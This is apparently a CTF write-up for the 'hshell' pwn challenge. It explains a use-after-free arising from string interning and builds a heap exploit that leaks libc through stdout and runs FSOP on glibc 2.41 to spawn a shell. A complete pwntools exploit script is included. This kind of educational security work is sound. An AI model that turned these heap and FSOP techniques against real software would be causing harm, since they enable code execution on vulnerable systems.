---
title: hshell
date: 2025-12-30
tags: 
- pwn
- author-fs
categories: YBNCTF 2025
---

by {% person fs %}

I didnt actually join YBNCTF as a participant so I just asked the chal author for the chal binaries and decided to solve them during the CTF for fun
For all the pwn challenges, I decided to solve the medium-insane ones all with unintended methods but I think this challenge is the most interesting out of them so I'm making a writeup for this

Below is the program source code 

```c
o#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

enum Type {
	NUMBER,
	STRING
};

typedef struct Variable {
	union {
		long num;
		char* buf;
	} val;
	size_t size;
	enum Type type;
	char* name;
} Variable;

Variable *variables[0x1000];
char *strings[0x1000];

void print_var(Variable* value) {
	switch (value->type) {
		case NUMBER: printf("%ld\n", value->val.num); break;
		case STRING: printf("%s\n", value->val.buf); break;
		default: _exit(1);
	}
}

uint64_t hash_str(const char *s) {
	uint64_t hash = 0xcbf29ce484222325ULL;
	while (*s) {
		hash ^= (unsigned char)*s++;
		hash *= 0x100000001b3ULL;
	}
	return hash;
}

Variable *new_string_var(const char *s) {
	Variable *v = malloc(sizeof(Variable));
	if (!v) _exit(1);

	v->type = STRING;
	v->name = NULL;

	size_t idx = (size_t)hash_str(s) % 0xfff;
	if (strings[idx]) {
		v->val.buf = strings[idx]; // string interning!
	} else {
		v->val.buf = strdup(s);
		strings[idx] = v->val.buf;
	}
	if (!v->val.buf) _exit(1);
	v->size = strlen(v->val.buf);

	return v;
}

Variable *new_number_var(long n) {
	Variable *v = malloc(sizeof(Variable));
	if (!v) _exit(1);

	v->type = NUMBER;
	v->name = NULL;
	v->val.num = n;
	v->size = 0;

	return v;
}

void free_var(Variable *var) {
	if (var->type == STRING) free(var->val.buf);
	free(var->name);
	free(var);
}

void set_var(const char* name, const char* p) {
	char *strval;
	long longval = strtol(p+1, &strval, 10);
	Variable *var;

	size_t idx = (size_t)hash_str(name) % 0xfff;

	if (variables[idx]) {
		free_var(variables[idx]);
		variables[idx] = NULL;
	}
	
	if (*strval) {
		var = new_string_var(p+1);
		var->name = strdup(name);
	} else {
		var = new_number_var(longval);
		var->name = strdup(name);
	}
	variables[idx] = var;
}

void modify_var(const char* name, const char* p) {
	char *strval;
	long longval = strtol(p+1, &strval, 10);
	size_t idx = (size_t)hash_str(name) % 0xfff;
	size_t len;
	Variable *var;

	if (!(variables[idx])) return;
	var = variables[idx];

	if (*strval) {
		size_t len = strlen(p+1);
		memcpy(var->val.buf, p+1, (len > var->size) ? var->size : len);
	} else {
		var->val.num = longval;
	}
}

void hint(const char* name) {
	char *p = strchr(name, ')');
	*p = 0;

	Variable *var;
	size_t idx = (size_t)hash_str(name) % 0xfff;
	if (!(variables[idx])) return;
	var = variables[idx];

	printf("%s: %ld\n", name, ((long)var->val.num >> 12) & 0xf);
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	char cmd[4096];
	char *p;
	int hints = 0;
	while (1) {
		puts("> ");
		fgets(cmd, sizeof(cmd), stdin);
		
		if (strchr(cmd, '\n'))
			cmd[strcspn(cmd, "\n")] = '\0';
		
		if (cmd[0] == '$') {
			p = strchr(cmd, '*');
			if (p) {
				*p = 0;
				p += 1;
				if (*p == '=') {
					*p = 0;
					modify_var(cmd+1, p);
				} 
			}
			p = strchr(cmd, '=');
			if (p) {
				*p = 0;
				set_var(cmd+1, p);
			}
		}

		if (!strncmp(cmd, "hint(", 5)) {
			if (hints > 0) continue;	
			p = strchr(cmd, '(');
			hint(p+1);
		}
	}
}
```

This program basically mimics basic variable setting whether it sets through string/number. However, what makes this difficult is the fact that once again, this is a leakless pwn and the hard to see UAF vuln. 

If we pay close attention to the new_string_var() function, it allocates a Variable and inside the variable, it has a pointer to buf. we can see that if we assign a string to the variable such that it isn't found in strings[idx], it will call var->buf=strdup(s). But what's so significant about strdup?

Looking at elixir bootlin, strdup is defined as such

```c
char *
__strdup (const char *s)
{
  size_t len = strlen (s) + 1;
  void *new = malloc (len);

  if (new == NULL)
    return NULL;

  return (char *) memcpy (new, s, len);
}
```

MALLOC?? this lets us do arbitrary size allocations. After this is called, strings[idx] is set to pointer returned by malloc Not only that, if we pass in a string that's already in strings[idx], it will simply use string interning and does val->buf=strings[idx] which actually reuses the malloced pointer

While this seems fine as first, when we look at set_var() function, we can see that if a variable of the same name already exists, it will first free the var and not only that, it does free(var->buf). However, what if we created 2 variables that has the same var->buf pointer and modify one of them. Well, the other variable can still write into var->buf even though it's been freed. UAF achieved

Moreover, since you have the choice to reassign the value as a number or string variable, if you should choose number, it will js call malloc() to create the Variable object only leaving the freed var-> buf in whatever bin it was freed into.

However, how do we even get a leak in the first place? In leakless pwn chals, the goal to get a leak is to always corrupt stdout->_IO_write_base (refer to the fsophammer post I made talking about it) so we can leak whatever libc pointers in between _IO_write_base and _IO_write_ptr in stdout. 

Now, remember how if a chunk is in the unsorted bin and you malloc it back, it will have a main arena pointer inside it already and you could technically partial overwrite it to point to stdout. However that's a bit poimtless right now since we cant arb allocate and we cant arb read into the pointer yet. But let's imagine a scenario where var->buf was freed into unsorted bin and reallocated as a Variable object itself (new_var). 

Even though new_var->buf would instantly be overwritten by another malloced heap address becuase of strdup(), we can reimagine this scenario such that if we had first created new_var and overlapped new_var and var->buf and var->buf was still in unsorted bin, new_var->buf would now point to a main arena pointer which we can partial overwrite with the UAF we have to point to stdout. then read data into stdout.

But how do you achieve something like this? 

First step: we allocate multiple bufs (>0x410 size) by creating multiple string variables and we intentionally create 2 variables that share the same var->buf pointer. We free one of them and first allocate a number var to get rid of the pointer in tcache produced by free(var) and then reallocate the buf as a new_var and create another variable below it (victim var) as well as 1 other variable (varA).

Let's once again create another variable called var B with the same string making var A and var B to share the same buffer. But let's now free var A and allocate first a number to use up the freed Variable in tcache, and then allocate back var Cas a string to reuse the freed var->buf that was previously in var A 

Now, the new_var size would be set to 0x30 however from a different variable, we can use the UAF and technically now modify the new_var->buf using modify_var to instead read in >0x410 bytes and overwrite the size field of the chunk belonging to victim var to something even greater say 0x600 bytes.

Now, assuming we've set up a fake chunk at victim_var+0x600, we can now free the victim_var and in the process of doing so, we would have freed not only the victim var, but because of the size increase, the other two variables (varB, var C) . Now, that var C is overlapping with var B's buf pointer, and we have this 0x600 chunk in unsorted, we can start using remaindering to slowly slice the chunk away and eventually a main arena pointer will land in var C's buf pointer. Now, we can partial overwrite this main arena pointer from var B to make it point to _IO_2_1_stdout (stdout) and then read into it from varC since varC's buf now points to _IO_2_1_stdout. 

With this, we can now modify _IO_write_base last 2 bytes such that _IO_write_base<_IO_write_ptr and set flags to 0xfbad1887 (be careful to avoid null bytes coz strlen() is use here). Once puts(">") is called, it will trigger a libc leak and now we can proceed to RCE.

Now, the intended solution does the heap attack differently and the RCE much more differently as it involves getting a PIE leak through a libc pointer and faking a _IO_2_1_stdout structure in libc writeable space before overwriting stdout global pointer with the fake structure to fsop. However, I decided to skip all of that and do FSOP directly on _IO_2_1_stdout

However, given the restrictions of strlen(), we cant do FSOP in 1 shot and we basically can only overwrite each field of _IO_2_1_stdout by 8 bytes before puts(">") is called. Now to adjust the offset into _IO_2_1_stdout to write into, we can keep partial overwriting the pointer from var B to the specific offset in stdout we want to read into from var C like (_IO_2_1_stdout+0x10 or 0x18...) . To prevent puts() from screwing up our FSOP payload, we can set the stdout flags to 0xfbad2888 which basically means _IO_NO_WRITES. Now, for the main fsop, I could not use nobodyisnobody's payload since it's 2.41 and it just fails. So I basically stepped through the function calls in GDB and made my own FSOP payload to be compatible with 2.41. I will let yall explore it yourselves although do note that the FSOP payload I used might have some unnecessary writes since I did technically modify from nobodyisnobody but if it works, it works

Once we overwrite vtable pointer and puts() is called, system("/bin/sh") is trigerred and we get shell!

Now, the payload I use below is super unclear but the core logic of the payload should be equilavent to whatever I have mentioned above albeit a few chunk size differences or random variable initializations to make the remaindering nicely put main arena pointer into the buf space. 

```py
from pwn import *

p=process("./shell_prog_patched")
#p=remote("tcp.ybn.sg", "10798")
#gdb.attach(p)
libc=ELF("libc.so.6")

def createStringVar(var_name,var_data):
    p.recvuntil(b">")
    p.sendline(b"$"+var_name+b"="+var_data)

def modifyVar(var_name,var_data):
    p.recvuntil(b">")
    p.sendline(b"$"+var_name+b"*="+var_data)

def sendPayload(gadget,stdout,lock,vtable):
    p.sendline(b"$ABCD*="+b"\xa0\x58")
    p.sendline(b"$L*="+p64(stdout))
    p.sendline(b"$ABCD*="+b"\x28\x56")
    p.sendline(b"$L*="+p64(gadget))
    p.sendline(b"$ABCD*="+b"\xd0\x55")
    p.sendline(b"$L*="+p64(libc.sym['system']))
    p.sendline(b"$ABCD*="+b"\x08\x56")
    p.sendline(b"$L*="+p64(gadget))
    p.sendline(b"$ABCD*="+b"\x48\x56")
    p.sendline(b"$L*="+p64(lock))
    p.sendline(b"$ABCD*="+b"\x58\x56")
    p.sendline(b"$L*="+p64(libc.sym['system']))
    p.sendline(b"$ABCD*="+b"\x60\x56")
    p.sendline(b"$L*="+p64(stdout+0x200))
    p.sendline(b"$ABCD*="+b"\x78\x56")
    p.sendline(b"$L*="+p64(libc.sym['system']))
    p.sendline(b"$ABCD*="+b"\x18\x56")
    p.sendline(b"$L*="+b"/bin/sh\x00")
    #input("")
    p.sendline(b"$ABCD*="+b"\x98\x56")
    p.sendline(b"$L*="+p64(vtable))

    
    
    
"""
 p.sendline(b"$ABCD*="+b"\xf0\x55")
    p.sendline(b"$L*="+b"/bin/sh\x00")
    """
createStringVar(b"A",b"C"*0x430)

createStringVar(b"B",b"C"*0x430)
createStringVar(B"C",b"16")
createStringVar(B"KAL",b"A"*0x200)
createStringVar(B"BAL",b"T"*0x200)


createStringVar(b"A",b"16")

createStringVar(b"D",b"16")
createStringVar(b"E",b"32")
createStringVar(b"NV",b"B"*0x10)
createStringVar(b"F",b"N"*0x20)

createStringVar(b"F",b"16")

createStringVar(b"L",b"A"*0x10)
#createStringVar(b"F",b"c"*0x40)

#createStringVar(b"S",b"b"*0x40)
#createStringVar(b"Z",b"b"*0x40)

modifyVar(b"B",b"A"*(0x28+32)+p64(0x471+0x50+0x210+0x20))

createStringVar(b"E",b"16")
createStringVar(b"G",b"G"*(0x1f0))

createStringVar(b"M",b"l"*0x20)

createStringVar(b"ABCD",b"N"*0x20)
modifyVar(b"ABCD",b"\xc0\x55")
modifyVar(b"L",p64(0xfbad1887))
modifyVar(b"ABCD",b"\xe0\x55")
modifyVar(b"L",b"\x01")
p.recv(7)
p.recv(39)
sleep(0.1)
stdout_leak=u64(p.recv(8).ljust(8,b"\x00"))
print(hex(stdout_leak))
libc.address=stdout_leak-0x1e88e0
modifyVar(b"ABCD",b"\xc0\x55")
modifyVar(b"L",p64(0xfbad2888))
gadget=libc.address+0x000000000013a1e7
stdout=libc.sym['_IO_2_1_stdout_']
fake_vtable=libc.sym['_IO_wfile_jumps']-0x18
stdout_lock=libc.address+0x1ea7b0
print(hex(stdout))
print(hex(stdout_lock))
#input("")
print(hex(fake_vtable))
sendPayload(gadget,stdout,stdout_lock,fake_vtable)
p.sendline(b"ls")
p.interactive()
```

Running this, we get the flag `YBN25{they_skipped_abc_and_went_straight_to_z_can_you_believe_that_no_bshell_or_cshell_but_a_zshell}`
